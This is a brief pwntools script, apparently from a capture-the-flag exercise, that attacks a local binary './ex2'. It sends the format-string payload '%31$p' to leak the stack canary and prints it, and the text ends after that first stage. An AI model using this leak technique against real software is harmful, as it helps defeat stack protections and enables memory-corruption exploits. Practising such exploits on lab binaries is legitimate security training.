from pwn import * 
from LibcSearcher import * 
context.log_level = 'debug' 
p=process('./ex2')
p.recvuntil(b'Hello Hacker!\n')
p.sendline(b'%31$p')
pause()
p.recvuntil(b'0x')
canary=int(p.recv(8).decode(),16)   
print("canary",hex(canary))

